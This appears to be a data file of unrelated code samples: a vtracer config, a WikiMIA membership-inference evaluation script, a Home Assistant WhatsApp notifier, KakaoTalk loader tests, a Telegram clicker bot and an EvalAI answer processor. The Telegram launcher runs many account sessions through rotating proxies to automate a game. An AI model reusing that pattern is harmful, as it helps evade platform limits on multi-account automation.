\"max_iterations\": 10,        # default: 10\n            \"splice_threshold\": 45,      # default: 45\n            \"path_precision\": 8          # default: 8\n        },\n        \"min_area_ratio\": 16,\n        \"resize_width\": None,\n        \"if_resize\": False,\n        \"rescale_width\": None, # 512\n        \"if_post_process\": True,\n        \"simplify_threshold\": None,\n        \"truncate_len\": 20480,\n        \"max_num_path\": 1 # ensure that the number of paths is 1\n    },\n    \"default\": {\n        \"vtracer_config\":{\n            \"colormode\":'color',        # [\"color\"] or \"binary\"\n            \"hierarchical\":'stacked',   # [\"stacked\"] or \"cutout\"\n            \"mode\": \"polygon\",            # [\"spline\"] \"polygon\", or \"none\"\n            \"filter_speckle\": 4,         # default: 4\n            \"color_precision\": 6,        # default: 6\n            \"layer_difference\": 16,      # default: 16\n            \"corner_threshold\": 60,      # default: 60\n            \"length_threshold\": 4,     # in [3.5, 10] default: 4.0\n            \"max_iterations\": 10,        # default: 10\n            \"splice_threshold\": 45,      # default: 45\n            \"path_precision\": 8          # default: 8\n        },\n        \"min_area_ratio\": 16,\n        \"resize_width\": None,\n        \"if_resize\": False,\n        \"rescale_width\": None, # 512\n        \"if_post_process\": True,\n        \"simplify_threshold\": None,\n        \"truncate_len\": None,\n        \"max_num_path\": None\n    },\n    \"natural\": {    \n        \"vtracer_config\":{\n            \"colormode\":'color',        # [\"color\"] or \"binary\"\n            \"hierarchical\":'stacked',   # [\"stacked\"] or \"cutout\"\n            \"mode\": \"polygon\",            # [\"spline\"] \"polygon\", or \"none\"\n            \"filter_speckle\": 6,         # default: 4\n            \"color_precision\": 6,        # default: 6\n            \"layer_difference\": 64,      # default: 16\n            \"corner_threshold\": 60,      # default: 60\n            \"length_threshold\": 4,     # in [3.5, 10] default: 4.0\n            \"max_iterations\": 10,        # default: 10\n            \"splice_threshold\": 45,      # default: 45\n            \"path_precision\": 8          # default: 8\n        },\n        \"min_area_ratio\": 16,\n        \"resize_width\": 224,\n        \"rescale_width\": 512,\n        \"if_resize\": True,\n        \"if_post_process\": True,\n        \"simplify_threshold\": None,\n        \"truncate_len\": None,\n        \"max_num_path\": None\n    },\n}",
    "import os, argparse\nfrom collections import defaultdict\nimport numpy as np\nimport pandas as pd\nfrom sklearn.metrics import roc_curve, auc\nfrom tqdm import tqdm\nimport zlib\n\nimport torch\nimport torch.nn.functional as F\n\nfrom transformers import AutoTokenizer, AutoModelForCausalLM\nfrom datasets import load_dataset\n\n\n# helper functions\ndef convert_huggingface_data_to_list_dic(dataset):\n    all_data = []\n    for i in range(len(dataset)):\n        ex = dataset[i]\n        all_data.append(ex)\n    return all_data\n\n# arguments\nparser = argparse.ArgumentParser()\nparser.add_argument('--model', type=str, default='EleutherAI/pythia-2.8b')\nparser.add_argument(\n    '--dataset', type=str, default='WikiMIA_length32', \n    choices=[\n        'WikiMIA_length32', 'WikiMIA_length64', 'WikiMIA_length128',\n        'WikiMIA_length32_paraphrased',\n        'WikiMIA_length64_paraphrased',\n        'WikiMIA_length128_paraphrased', \n    ]\n)\nparser.add_argument('--half', action='store_true')\nparser.add_argument('--int8', action='store_true')\nargs = parser.parse_args()\n\n# load model\ndef load_model(name, ref=False):\n    int8_kwargs = {}\n    half_kwargs = {}\n    # ref model is small and will be loaded in full precision\n    if args.int8 and not ref:\n        int8_kwargs = dict(load_in_8bit=True, torch_dtype=torch.bfloat16)\n    elif args.half and not ref:\n        half_kwargs = dict(torch_dtype=torch.bfloat16)\n    \n    if 'mamba' in name:\n        try:\n            from transformers import MambaForCausalLM\n        except ImportError:\n            raise ImportError\n        model = MambaForCausalLM.from_pretrained(\n            name, return_dict=True, device_map='auto', **int8_kwargs, **half_kwargs\n        )        \n    else:\n        model = AutoModelForCausalLM.from_pretrained(\n            name, return_dict=True, device_map='auto', **int8_kwargs, **half_kwargs\n        )\n    model.eval()\n    tokenizer = AutoTokenizer.from_pretrained(name)\n    return model, tokenizer\n\n# hard-coded ref model\nif 'pythia' in args.model:\n    args.ref_model = 'EleutherAI/pythia-70m'\nelif 'llama' in args.model:\n    args.ref_model = 'huggyllama/llama-7b'\nelif 'gpt-neox-20b' in args.model:\n    args.ref_model = 'EleutherAI/gpt-neo-125m'\nelif 'mamba' in args.model:\n    args.ref_model = 'state-spaces/mamba-130m-hf'\nelif 'opt' in args.model:\n    args.ref_model = 'facebook/opt-350m'\nelse:\n    raise NotImplementedError\n\nmodel, tokenizer = load_model(args.model)\nref_model, ref_tokenizer = load_model(args.ref_model, ref=True)\n\n# load dataset\nif not 'paraphrased' in args.dataset:\n    dataset = load_dataset('swj0419/WikiMIA', split=args.dataset)\nelse:\n    dataset = load_dataset('zjysteven/WikiMIA_paraphrased_perturbed', split=args.dataset)\ndata = convert_huggingface_data_to_list_dic(dataset)\n\n# inference - get scores for each input\ndef inference(text, model):\n    input_ids = torch.tensor(tokenizer.encode(text)).unsqueeze(0)\n    input_ids = input_ids.to(model.device)\n    with torch.no_grad():\n        outputs = model(input_ids, labels=input_ids)\n    loss, logits = outputs[:2]\n    ll = -loss.item() # log-likelihood\n    return ll\n\nscores = defaultdict(list)\nfor i, d in enumerate(tqdm(data, total=len(data), desc='Samples')): \n    text = d['input']\n    \n    ll = inference(text, model)\n    ll_ref = inference(text, ref_model)\n    ll_lowercase = inference(text.lower(), model)\n\n    # assuming the score is larger for training data\n    # and smaller for non-training data\n    # this is why sometimes there is a negative sign in front of the score\n    scores['ref'].append(ll - ll_ref)\n    scores['lowercase'].append(ll_lowercase / ll)\n\n# compute metrics\n# tpr and fpr thresholds are hard-coded\ndef get_metrics(scores, labels):\n    fpr_list, tpr_list, thresholds = roc_curve(labels, scores)\n    auroc = auc(fpr_list, tpr_list)\n    fpr95 = fpr_list[np.where(tpr_list >= 0.95)[0][0]]\n    tpr05 = tpr_list[np.where(fpr_list <= 0.05)[0][-1]]\n    return auroc, fpr95, tpr05\n\nlabels = [d['label'] for d in data] # 1: training, 0: non-training\nresults = defaultdict(list)\nfor method, scores in scores.items():\n    auroc, fpr95, tpr05 = get_metrics(scores, labels)\n    \n    results['method'].append(method)\n    results['auroc'].append(f\"{auroc:.1%}\")\n    results['fpr95'].append(f\"{fpr95:.1%}\")\n    results['tpr05'].append(f\"{tpr05:.1%}\")\n\ndf = pd.DataFrame(results)\nprint(df)\n\nsave_root = f\"results/{args.dataset}\"\nif not os.path.exists(save_root):\n    os.makedirs(save_root)\n\nmodel_id = args.model.split('/')[-1]\nif os.path.isfile(os.path.join(save_root, f\"{model_id}.csv\")):\n    df.to_csv(os.path.join(save_root, f\"{model_id}.csv\"), index=False, mode='a', header=False)\nelse:\n    df.to_csv(os.path.join(save_root, f\"{model_id}.csv\"), index=False)",
    "import logging\r\nimport json\r\nimport os\r\nfrom os.path import basename\r\nfrom urllib.parse import urlparse\r\nimport voluptuous as vol\r\nfrom whatsapp_api_client_python import API\r\nimport homeassistant.helpers.config_validation as cv\r\nfrom homeassistant.components.notify import (\r\n    ATTR_TARGET, ATTR_TITLE, ATTR_DATA, PLATFORM_SCHEMA, BaseNotificationService)\r\n\r\nATTR_INSTANCE = \"instance_id\"\r\nATTR_TOKEN = \"token\"\r\n\r\n\r\n_LOGGER = logging.getLogger(__name__)\r\n\r\nPLATFORM_SCHEMA = PLATFORM_SCHEMA.extend({\r\n    vol.Optional(ATTR_TARGET): cv.string,\r\n    vol.Required(ATTR_INSTANCE): cv.string,\r\n    vol.Required(ATTR_TOKEN): cv.string,\r\n    vol.Optional(ATTR_TITLE): cv.string,\r\n})\r\n\r\ndef get_service(hass, config, discovery_info=None):\r\n    \"\"\"Get the custom notifier service.\"\"\"\r\n    title = config.get(ATTR_TITLE)\r\n    token = config.get(ATTR_TOKEN)\r\n    instance_id = config.get(ATTR_INSTANCE)\r\n    target = config.get(ATTR_TARGET)\r\n    return GreenAPINotificationService(title, token, instance_id, target)\r\n\r\nclass GreenAPINotificationService(BaseNotificationService):\r\n    \r\n    def __init__(self, title, token,instance_id, target):\r\n        \"\"\"Initialize the service.\"\"\"\r\n        self._title = title\r\n        self._token = token\r\n        self._instance_id = instance_id\r\n        self._target = target\r\n        self._greenAPI = API.GreenAPI(self._instance_id, self._token)\r\n\r\n    def send_message(self, message=\"\", **kwargs):\r\n        \r\n        \"\"\"Send a message to the target.\"\"\"\r\n        \r\n        try:\r\n            title = kwargs.get(ATTR_TITLE)\r\n            if title is not None:\r\n                title = f\"*{title}*\"\r\n                message = f\"{title} \\n {message}\"\r\n            data = kwargs.get(ATTR_DATA)\r\n            target = kwargs.get(ATTR_TARGET)[0] if kwargs.get(ATTR_TARGET) is not None else self._target #Allow setting the target from either the service-call or the service config. Service call target can override the default config.\r\n            _LOGGER.info(f\"Sending message to {target}\")\r\n            if data is not None:\r\n                file_path = data[\"file\"]\r\n                if os.path.exists(file_path):\r\n                    upload_file_response = self._greenAPI.sending.uploadFile(file_path)\r\n                    if upload_file_response.code == 200:\r\n                        url_file = upload_file_response.data[\"urlFile\"]\r\n                        url = urlparse(url_file)\r\n                        file_name = basename(url.path)\r\n                        send_file_by_url_response = self._greenAPI.sending.sendFileByUrl(target, url_file, file_name, caption=message)\r\n            else:\r\n                self._greenAPI.sending.sendMessage(target, message)\r\n        except Exception as e:\r\n            _LOGGER.error(\"Sending message to %s: has failed with the following error %s\", kwargs.get(ATTR_TARGET)[0] ,str(e))",
    "import pytest\nfrom datetime import datetime\nfrom kakaotalk_loader import KaKaoTalkLoader\nimport pandas as pd\n\ndef test_process_time_to_24hr_format():\n    loader = KaKaoTalkLoader(file_path=\"dummy_path\", file_suffix=\".txt\")\n    date_obj = datetime(2024, 4, 5)\n\n    # \uc624\uc804 \uc2dc\uac04 \ud14c\uc2a4\ud2b8\n    assert loader.process_time_to_24hr_format(date_obj, \"\uc624\uc804 11:23\") == datetime(2024, 4, 5, 11, 23)\n\n    # \uc624\ud6c4 \uc2dc\uac04 \ud14c\uc2a4\ud2b8 (\uc624\ud6c4 12\uc2dc \uc81c\uc678)\n    assert loader.process_time_to_24hr_format(date_obj, \"\uc624\ud6c4 1:23\") == datetime(2024, 4, 5, 13, 23)\n\n    # \uc624\ud6c4 12\uc2dc \ud14c\uc2a4\ud2b8\n    assert loader.process_time_to_24hr_format(date_obj, \"\uc624\ud6c4 12:23\") == datetime(2024, 4, 5, 12, 23)\n\n    # \uc624\uc804 12\uc2dc \ud14c\uc2a4\ud2b8\n    assert loader.process_time_to_24hr_format(date_obj, \"\uc624\uc804 12:00\") == datetime(2024, 4, 5, 0, 0)\n\ndef test_process_date():\n    loader = KaKaoTalkLoader(file_path=\"dummy_path\", file_suffix=\".txt\")\n\n    # \uc815\uc0c1\uc801\uc778 \ub0a0\uc9dc \ubb38\uc790\uc5f4 \ud14c\uc2a4\ud2b8\n    is_parse, date = loader.process_date(\"-------- 2024\ub144 4\uc6d4 5\uc77c \ud654\uc694\uc77c --------\")\n    assert is_parse, date == pd.to_datetime(\"2024-04-05\")\n\n    # \uc798\ubabb\ub41c \ub0a0\uc9dc \ubb38\uc790\uc5f4 \ud14c\uc2a4\ud2b8\n    is_parse, date = loader.process_date(\"This is not a date\")\n    assert is_parse == False, date == \"This is not a date\"\n\ndef test_txt___read_file(mocker):\n    # \uac00\uc0c1\uc758 \ud30c\uc77c \ub0b4\uc6a9\n    fake_file_content = [\n        \"LLM RAG Langchain \ud1b5\ud569 \ub2d8\uacfc \uce74\uce74\uc624\ud1a1 \ub300\ud654\\n\",\n        \"\uc800\uc7a5\ud55c \ub0a0\uc9dc : 2024-04-05 01:36:14\\n\",\n        \"\\n\",\n        \"--------------- 2024\ub144 3\uc6d4 27\uc77c \uc218\uc694\uc77c ---------------\\n\",\n        \"TEST\ub2d8\uc774 \ub4e4\uc5b4\uc654\uc2b5\ub2c8\ub2e4.\ud0c0\uc778, \uae30\uad00 \ub4f1\uc758 \uc0ac\uce6d\uc5d0 \uc720\uc758\ud574 \uc8fc\uc138\uc694. \uae08\uc804 \ub610\ub294\uac1c\uc778\uc815\ubcf4\ub97c \uc694\uad6c \ubc1b\uc744 \uacbd\uc6b0 \uc2e0\uace0\ud574 \uc8fc\uc2dc\uae30 \ubc14\ub78d\ub2c8\ub2e4.\uc6b4\uc601\uc815\ucc45\uc744 \uc704\ubc18\ud55c \uba54\uc2dc\uc9c0\ub85c \uc2e0\uace0 \uc811\uc218 \uc2dc \uce74\uce74\uc624\ud1a1 \uc774\uc6a9\uc5d0 \uc81c\ud55c\uc774 \uc788\uc744 \uc218 \uc788\uc2b5\ub2c8\ub2e4. \\n\",\n        \"\ubd88\ubc95\ucd2c\uc601\ubb3c\ub4f1 \uc2dd\ubcc4 \ubc0f \uac8c\uc7ac\uc81c\ud55c \uc870\uce58 \uc548\ub0b4\\n\",\n        \"\uadf8\ub8f9 \uc624\ud508\ucc44\ud305\ubc29\uc5d0\uc11c \ub3d9\uc601\uc0c1\u30fb\uc555\ucd95\ud30c\uc77c \uc804\uc1a1 \uc2dc \uc804\uae30\ud1b5\uc2e0\uc0ac\uc5c5\ubc95\uc5d0 \ub530\ub77c \ubc29\uc1a1\ud1b5\uc2e0\uc2ec\uc758\uc704\uc6d0\ud68c\uc5d0\uc11c \ubd88\ubc95\ucd2c\uc601\ubb3c\ub4f1\uc73c\ub85c \uc2ec\uc758\u30fb\uc758\uacb0\ud55c \uc815\ubcf4\uc5d0 \ud574\ub2f9\ud558\ub294\uc9c0\ub97c \ube44\uad50\u30fb\uc2dd\ubcc4 \ud6c4 \uc804\uc1a1\uc744 \uc81c\ud55c\ud558\ub294 \uc870\uce58\uac00 \uc801\uc6a9\ub429\ub2c8\ub2e4. \ubd88\ubc95\ucd2c\uc601\ubb3c\ub4f1\uc744 \uc804\uc1a1\ud560 \uacbd\uc6b0 \uad00\ub828 \ubc95\ub839\uc5d0 \ub530\ub77c \ucc98\ubc8c\ubc1b\uc744 \uc218 \uc788\uc0ac\uc624\ub2c8 \uc11c\ube44\uc2a4 \uc774\uc6a9 \uc2dc \uc720\uc758\ud558\uc5ec \uc8fc\uc2dc\uae30 \ubc14\ub78d\ub2c8\ub2e4.\\n\",\n        \"\uc131\ubbfc\uc0c1\ub2d8\uc774 \ub4e4\uc5b4\uc654\uc2b5\ub2c8\ub2e4.\\n\",\n        \"[\uac00\ub098\ub2e4] [\uc624\uc804 10:55] \uc548\ub155\ud558\uc138\uc694\\n\",\n        \"[\uac00\ub098\ub2e4] [\uc624\uc804 10:55] RAG\uad00\ub828\ud574\uc11c \uc9c8\ubb38 \ud574\ub3c4\ub420\uae4c\uc694\\n\",\n        \"[\uac00\ub098\ub2e4] [\uc624\uc804 10:57] \ud639\uc2dc \ud55c\uad6d\uc5b4\uc5d0 \uc720\ub9ac\ud55c \uc784\ubca0\ub529 \ubc29\ubc95\uc774 \uc788\uc744\uac00\uc694?\\n\",\n        \"[J] [\uc624\uc804 11:00] Bge m3 \ubaa8\ub378\uc774 \uc798\ud569\ub2c8\ub2e4\\n\",\n        \"[\uac00\ub098\ub2e4] [\uc624\uc804 11:01] \uc624\uc6b0 \uac10\uc0ac\ud569\ub2c8\ub2e4 \\n\",\n        \"rag \uc785\ubb38\uc778\ub370\\n\",\n        \"[\uac00\ub098\ub2e4] [\uc624\uc804 11:01] \uacbd\uc6b0\uc758\uc218\uac00 \ub108\ubb34 \ub9ce\ub124\uc694\\n\",\n        \"[ABC] [\uc624\uc804 11:05] OPENAI \uc784\ubca0\ub529 \uc4f0\ub294 \uac83\ubcf4\ub2e4 \ud6a8\uacfc\uac00 \uc88b\uc740 \uac83\uc778\uac00\uc694?\\n\",\n        \"[DEF] [\uc624\uc804 11:06] \uc628\ud504\ub808\ubbf8\uc2a4\ub85c \ub3cc\ub9b4 \ubaa9\uc801\uc774\uc2e0\uac00\u2026\\n\",\n        \"[GHF] [\uc624\uc804 11:06] https://huggingface.co/BAAI/bge-m3\\n\",\n        \"[GHF] [\uc624\uc804 11:07] multilingual\uc774\ub77c\uace0 \uc368\uc788\uae34\ud55c\ub300 \ud55c\uad6d\uc5b4 \uc784\ubca0\ub529 \uc131\ub2a5\ub3c4 \uc798 \ub098\uc624\ub824\ub098\uc694\\n\",\n        \"[1234] [\uc624\uc804 11:08] \ud604\uc874\ud558\ub294 \uac83 \uc911\uc5d0\uc120 \ud55c\uad6d\uc5b4 \uc784\ubca0\ub529\uc774 \uc81c\uc77c \uc88b\uc740 \uac83 \uac19\uc544\uc694. \ub3c4\uba54\uc778 \ubcc4\ub85c \ub2e4\ub97c \uc218\ub3c4 \uc788\uc73c\ub2c8 \uc9c1\uc811 \ubcf8\uc778 \ub370\uc774\ud130\uc14b\uc73c\ub85c \ud574\ubcf4\uc154\uc11c \ud14c\uc2a4\ud2b8 \ud574\ubcf4\uc138\uc694\\n\",\n        \"[1234] [\uc624\uc804 11:26] bge m3 \uc784\ubca0\ub529 \uc804\uc5d0 \uaf2d \uc804\ucc98\ub9ac \ud574\uc57c \ud560 \ud301\uc774 \uc788\uc744\uae4c\uc694? \uadf8\ub0e5 \ubb38\uc7a5 \ub123\uc5b4\ub3c4 \uc758\ubbf8\uc801\uc73c\ub85c \uc798 \ub9cc\ub4dc\ub294 \uac83\uc77c\uc9c0..\\n\",\n        \"[J] [\uc624\uc804 11:26] \uadf8\ub0e5 \ub123\uc74c\ub429\ub2c8\ub2e4 html \ud0dc\uadf8 \uac19\uc740\uac74 \ube7c\ub294\uac8c \uc88b\uaca0\uad70\uc694\\n\",\n        \"[\uac00\ub098\ub2e4] [\uc624\uc804 11:29] \ud06c \ubaa8\ub450 \uac10\uc0ac\ud569\ub2c8\ub2e4 \\n\",\n    ]\n    \n    # \ud30c\uc77c \uc77d\uae30\ub97c \uc704\ud55c \ubaa8\uc758 \uc124\uc815\n    mocker.patch('builtins.open', mocker.mock_open(read_data=\"\\n\".join(fake_file_content)))\n    \n    loader = KaKaoTalkLoader(file_path=\"dummy_path\", file_suffix=\".txt\")\n    documents = list(loader._read_file_test(open(\"dummy_path\")))\n    \n    # \uae30\ub300\ub418\ub294 \ucd9c\ub825 \ud655\uc778\n    # \uc608\uc81c\uc5d0\uc11c\ub294 \ub2e8\uc21c\ud788 \ubb38\uc11c\uc758 \uac1c\uc218\uc640 \uccab \ubc88\uc9f8 \ubb38\uc11c\uc758 \ub0a0\uc9dc\ub97c \ud655\uc778\ud569\ub2c8\ub2e4.\n    # \uc2e4\uc81c \ud14c\uc2a4\ud2b8\uc5d0\uc11c\ub294 \ub354 \uc138\ubc00\ud55c \uc870\uac74\uc744 \ud655\uc778\ud574\uc57c \ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4.\n    expected_number_of_documents = 14  # \uac00\uc0c1\uc758 \ud30c\uc77c \ub0b4\uc6a9\uc5d0 \ub530\ub77c \uc870\uc815\n    assert len(documents) == expected_number_of_documents\n    \n    # \uccab \ubc88\uc9f8 \ub300\ud654\uc758 \ub0a0\uc9dc\uc640 \uba54\uc2dc\uc9c0 \ub0b4\uc6a9 \ud655\uc778\n    assert documents[0].metadata['date'] == \"2024-03-27 10:55:00\"\n    assert documents[0].page_content == '\"User: **, Message: \uc548\ub155\ud558\uc138\uc694'\n\n",
    "import os\nimport glob\nimport asyncio\nimport argparse\nfrom itertools import cycle\n\nfrom pyrogram import Client\nfrom better_proxy import Proxy\n\nfrom bot.config import settings\nfrom bot.utils import logger\nfrom bot.core.slapper import run_slapper\nfrom bot.core.registrator import register_sessions\n\n\nstart_text = \"\"\"\n\n\u2592\u2588  \u2592\u2588 \u2588\u2580\u2580\u2588 \u2588\u2580\u2580\u2588 \u2588\u2580\u2584\u2580\u2588 \u2592\u2588\u2580\u2580\u2580\u2588 \u2588   \u2588\u2580\u2580\u2588 \u2588\u2580\u2580\u2588 \u2592\u2588\u2580\u2580\u2588 \u2588\u2580\u2580\u2588 \u2580\u2580\u2588\u2580\u2580 \n\u2592\u2588\u2592\u2588\u2592\u2588 \u2588  \u2588 \u2588\u2584\u2584\u2580 \u2588 \u2580 \u2588  \u2580\u2580\u2580\u2584\u2584 \u2588   \u2588\u2584\u2584\u2588 \u2588  \u2588 \u2592\u2588\u2580\u2580\u2584 \u2588  \u2588   \u2588   \n\u2592\u2588\u2584\u2580\u2584\u2588 \u2580\u2580\u2580\u2580 \u2580 \u2580\u2580 \u2580   \u2580 \u2592\u2588\u2584\u2584\u2584\u2588 \u2580\u2580\u2580 \u2580  \u2580 \u2588\u2580\u2580\u2580 \u2592\u2588\u2584\u2584\u2588 \u2580\u2580\u2580\u2580   \u2580   \n\nSelect an action:\n\n    1. Create session\n    2. Run clicker\n\"\"\"\n\n\ndef get_session_names() -> list[str]:\n    session_names = glob.glob('sessions/*.session')\n    session_names = [os.path.splitext(os.path.basename(file))[0] for file in session_names]\n\n    return session_names\n\n\ndef get_proxies() -> list[Proxy]:\n    if settings.USE_PROXY_FROM_FILE:\n        with open(file='bot/config/proxies.txt', encoding='utf-8-sig') as file:\n            proxies = [Proxy.from_str(proxy=row.strip()).as_url for row in file]\n    else:\n        proxies = []\n\n    return proxies\n\n\nasync def get_tg_clients() -> list[Client]:\n    session_names = get_session_names()\n\n    if not session_names:\n        raise FileNotFoundError(\"Not found session files\")\n\n    if not settings.API_ID or not settings.API_HASH:\n        raise ValueError(\"API_ID and API_HASH not found in the .env file.\")\n\n    tg_clients = [Client(\n        name=session_name,\n        api_id=settings.API_ID,\n        api_hash=settings.API_HASH,\n        workdir='sessions/',\n        plugins=dict(root='bot/plugins')\n    ) for session_name in session_names]\n\n    return tg_clients\n\n\nasync def process() -> None:\n    parser = argparse.ArgumentParser()\n    parser.add_argument('-a', '--action', type=int, help='Action to perform')\n\n    logger.info(f\"Detected {len(get_session_names())} sessions | {len(get_proxies())} proxies\")\n\n    action = parser.parse_args().action\n\n    if not action:\n        print(start_text)\n\n        while True:\n            action = input(\"> \")\n\n            if not action.isdigit():\n                logger.warning(\"Action must be number\")\n            elif action not in ['1', '2']:\n                logger.warning(\"Action must be 1 or 2\")\n            else:\n                action = int(action)\n                break\n\n    if action == 1:\n        await register_sessions()\n    elif action == 2:\n        tg_clients = await get_tg_clients()\n\n        await run_tasks(tg_clients=tg_clients)\n\n\nasync def run_tasks(tg_clients: list[Client]):\n    proxies = get_proxies()\n    proxies_cycle = cycle(proxies) if proxies else None\n    tasks = [asyncio.create_task(run_slapper(tg_client=tg_client, proxy=next(proxies_cycle) if proxies_cycle else None))\n             for tg_client in tg_clients]\n\n    await asyncio.gather(*tasks)\n",
    "# Copyright (c) Facebook, Inc. and its affiliates.\r\nimport re\r\n\r\nfrom tqdm import tqdm\r\n\r\n\r\nclass EvalAIAnswerProcessor:\r\n    \"\"\"\r\n    Processes an answer similar to Eval AI\r\n        copied from\r\n        https://github.com/facebookresearch/mmf/blob/c46b3b3391275b4181567db80943473a89ab98ab/pythia/tasks/processors.py#L897\r\n    \"\"\"\r\n\r\n    CONTRACTIONS = {\r\n        \"aint\": \"ain't\",\r\n        \"arent\": \"aren't\",\r\n        \"cant\": \"can't\",\r\n        \"couldve\": \"could've\",\r\n        \"couldnt\": \"couldn't\",\r\n        \"couldn'tve\": \"couldn't've\",\r\n        \"couldnt've\": \"couldn't've\",\r\n        \"didnt\": \"didn't\",\r\n        \"doesnt\": \"doesn't\",\r\n        \"dont\": \"don't\",\r\n        \"hadnt\": \"hadn't\",\r\n        \"hadnt've\": \"hadn't've\",\r\n        \"hadn'tve\": \"hadn't've\",\r\n        \"hasnt\": \"hasn't\",\r\n        \"havent\": \"haven't\",\r\n        \"hed\": \"he'd\",\r\n        \"hed've\": \"he'd've\",\r\n        \"he'dve\": \"he'd've\",\r\n        \"hes\": \"he's\",\r\n        \"howd\": \"how'd\",\r\n        \"howll\": \"how'll\",\r\n        \"hows\": \"how's\",\r\n        \"Id've\": \"I'd've\",\r\n        \"I'dve\": \"I'd've\",\r\n        \"Im\": \"I'm\",\r\n        \"Ive\": \"I've\",\r\n        \"isnt\": \"isn't\",\r\n        \"itd\": \"it'd\",\r\n        \"itd've\": \"it'd've\",\r\n        \"it'dve\": \"it'd've\",\r\n        \"itll\": \"it'll\",\r\n        \"let's\": \"let's\",\r\n        \"maam\": \"ma'am\",\r\n        \"mightnt\": \"mightn't\",\r\n        \"mightnt've\": \"mightn't've\",\r\n        \"mightn'tve\": \"mightn't've\",\r\n        \"mightve\": \"might've\",\r\n        \"mustnt\": \"mustn't\",\r\n        \"mustve\": \"must've\",\r\n        \"neednt\": \"needn't\",\r\n        \"notve\": \"not've\",\r\n        \"oclock\": \"o'clock\",\r\n        \"oughtnt\": \"oughtn't\",\r\n        \"ow's'at\": \"'ow's'at\",\r\n        \"'ows'at\": \"'ow's'at\",\r\n        \"'ow'sat\": \"'ow's'at\",\r\n        \"shant\": \"shan't\",\r\n        \"shed've\": \"she'd've\",\r\n        \"she'dve\": \"she'd've\",\r\n        \"she's\": \"she's\",\r\n        \"shouldve\": \"should've\",\r\n        \"shouldnt\": \"shouldn't\",\r\n        \"shouldnt've\": \"shouldn't've\",\r\n        \"shouldn'tve\": \"shouldn't've\",\r\n        \"somebody'd\": \"somebodyd\",\r\n        \"somebodyd've\": \"somebody'd've\",\r\n        \"somebody'dve\": \"somebody'd've\",\r\n        \"somebodyll\": \"somebody'll\",\r\n        \"somebodys\": \"somebody's\",\r\n        \"someoned\": \"someone'd\",\r\n        \"someoned've\": \"someone'd've\",\r\n        \"someone'dve\": \"someone'd've\",\r\n        \"someonell\": \"someone'll\",\r\n        \"someones\": \"someone's\",\r\n        \"somethingd\": \"something'd\",\r\n        \"somethingd've\": \"something'd've\",\r\n        \"something'dve\": \"something'd've\",\r\n        \"somethingll\": \"something'll\",\r\n        \"thats\": \"that's\",\r\n        \"thered\": \"there'd\",\r\n        \"thered've\": \"there'd've\",\r\n        \"there'dve\": \"there'd've\",\r\n        \"therere\": \"there're\",\r\n        \"theres\": \"there's\",\r\n        \"theyd\": \"they'd\",\r\n        \"theyd've\": \"they'd've\",\r\n        \"they'dve\": \"they'd've\",\r\n        \"theyll\": \"they'll\",\r\n        \"theyre\": \"they're\",\r\n        \"theyve\": \"they've\",\r\n        \"twas\": \"'twas\",\r\n        \"wasnt\": \"wasn't\",\r\n        \"wed've\": \"we'd've\",\r\n        \"we'dve\": \"we'd've\",\r\n        \"weve\": \"we've\",\r\n        \"werent\": \"weren't\",\r\n        \"whatll\": \"what'll\",\r\n        \"whatre\": \"what're\",\r\n        \"whats\": \"what's\",\r\n        \"whatve\": \"what've\",\r\n        \"whens\": \"when's\",\r\n        \"whered\": \"where'd\",\r\n        \"wheres\": \"where's\",\r\n        \"whereve\": \"where've\",\r\n        \"whod\": \"who'd\",\r\n        \"whod've\": \"who'd've\",\r\n        \"who'dve\": \"who'd've\",\r\n        \"wholl\": \"who'll\",\r\n        \"whos\": \"who's\",\r\n        \"whove\": \"who've\",\r\n        \"whyll\": \"why'll\",\r\n        \"whyre\": \"why're\",\r\n        \"whys\": \"why's\",\r\n        \"wont\": \"won't\",\r\n        \"wouldve\": \"would've\",\r\n        \"wouldnt\": \"wouldn't\",\r\n        \"wouldnt've\": \"wouldn't've\",\r\n        \"wouldn'tve\": \"wouldn't've\",\r\n        \"yall\": \"y'all\",\r\n        \"yall'll\": \"y'all'll\",\r\n        \"y'allll\": \"y'all'll\",\r\n        \"yall'd've\": \"y'all'd've\",\r\n        \"y'alld've\": \"y'all'd've\",\r\n        \"y'all'dve\": \"y'all'd've\",\r\n        \"youd\": \"you'd\",\r\n        \"youd've\": \"you'd've\",\r\n        \"you'dve\": \"you'd've\",\r\n        \"youll\": \"you'll\",\r\n        \"youre\": \"you're\",\r\n        \"youve\": \"you've\",\r\n    }\r\n\r\n    NUMBER_MAP = {\r\n        \"none\": \"0\",\r\n        \"zero\": \"0\",\r\n        \"one\": \"1\",\r\n        \"two\": \"2\",\r\n        \"three\": \"3\",\r\n        \"four\": \"4\",\r\n        \"five\": \"5\",\r\n        \"six\": \"6\",\r\n        \"seven\": \"7\",\r\n        \"eight\": \"8\",\r\n        \"nine\": \"9\",\r\n        \"ten\": \"10\",\r\n    }\r\n    ARTICLES = [\"a\", \"an\", \"the\"]\r\n    PERIOD_STRIP = re.compile(r\"(?!<=\\d)(\\.)(?!\\d)\")\r\n    COMMA_STRIP = re.compile(r\"(?<=\\d)(\\,)+(?=\\d)\")\r\n    PUNCTUATIONS = [\r\n        \";\",\r\n        r\"/\",\r\n        \"[\",\r\n        \"]\",\r\n        '\"',\r\n        \"{\",\r\n        \"}\",\r\n        \"(\",\r\n        \")\",\r\n        \"=\",\r\n        \"+\",\r\n        \"\\\\\",\r\n        \"_\",\r\n        \"-\",\r\n        \">\",\r\n        \"<\",\r\n        \"@\",\r\n        \"`\",\r\n        \",\",\r\n        \"?\",\r\n        \"!\",\r\n    ]\r\n\r\n    def __init__(self, *args, **kwargs):\r\n        pass\r\n\r\n    def word_tokenize(self, word):\r\n        word = word.lower()\r\n        wo",
